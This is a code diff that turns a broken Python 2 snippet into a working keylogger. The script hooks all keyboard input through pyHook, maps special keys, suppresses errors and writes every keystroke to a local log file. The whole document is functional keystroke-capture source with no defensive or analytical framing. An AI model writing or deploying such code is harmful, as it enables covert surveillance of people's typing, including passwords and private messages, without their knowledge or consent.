@@ -1,20 +1,47 @@
+#! python2
+
 # Python keylogger
-# DaniWeb: https://www.daniweb.com/software-development/python/threads/229564/python-keylogger
 
 import pythoncom
 import pyHook
 import sys
 import logging
+import time
 
-LOG_FILENAME = 'path\to\log.out'
+log = "" 
+logdir = "loggedfiles\log.txt"
+
+openfile = open(logdir, "w")
+openfile.write("")
 
 def OnKeyboardEvent(event):
-	logging.basicConfig(filename=LOG_FILENAME, level=logging.DEBUG, format='%(message)s')
-	print "Key: ", chr(event.Ascii)
-	logging.log(10,chr(event.Ascii)
-	return true
+	try:
+		global log
+		if event.Ascii == 27:
+			log = "[ESC]"
+		elif event.Ascii == 8:
+			log = "[Backspace]"
+		elif event.Ascii == 15:
+			openfile.close()
+			sys.exit()
+		
+			
+		
+		elif event.Ascii == 13:
+			log = "\n"
+		elif event.Ascii == 0:
+			log = ""
+		else:
+			log = chr(event.Ascii)
+			print(chr(event.Ascii))
+		openfile.write(log)
+		
+	except:
+		pass
 	
 hm = pyHook.HookManager()
 hm.KeyDown = OnKeyboardEvent
 hm.HookKeyboard()
-pythoncom.PumpMessages()
+
+while True:
+	pythoncom.PumpMessages()
